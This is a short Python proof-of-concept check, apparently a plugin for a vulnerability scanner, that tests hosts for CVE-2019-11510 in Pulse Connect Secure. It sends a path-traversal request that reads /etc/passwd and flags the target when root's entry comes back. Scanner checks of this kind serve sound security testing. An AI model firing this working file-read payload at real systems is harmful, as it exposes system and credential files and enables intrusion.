#已验证
# -*- coding: utf-8 -*-
# poc_scripts/POC1.py

import sys
from scan.lib.Requests import Requests


def check(url, ip, ports):
    req = Requests()
    payload = r"/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/"
    full_url = f"http://{ip}:{ports}{payload}"
    try:
        r = req.get(full_url)
        if 'root:x:0:0:root' in r:
            return f'CVE-2019-11510 Pulse Connect Secure File | {full_url}'
    except Exception as e:
        print(f"Error: {e}")
    return None

'''
if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("Usage: python POC1.py <url> <ip> <port>")
        sys.exit(1)
    
    url = sys.argv[1]
    ip = sys.argv[2]
    port = int(sys.argv[3])

    print(f"Running check with url={url}, ip={ip}, port={port}")

    result = check(url, ip, port)
    if result:
        print(result)
    else:
        print("No vulnerability found.")
'''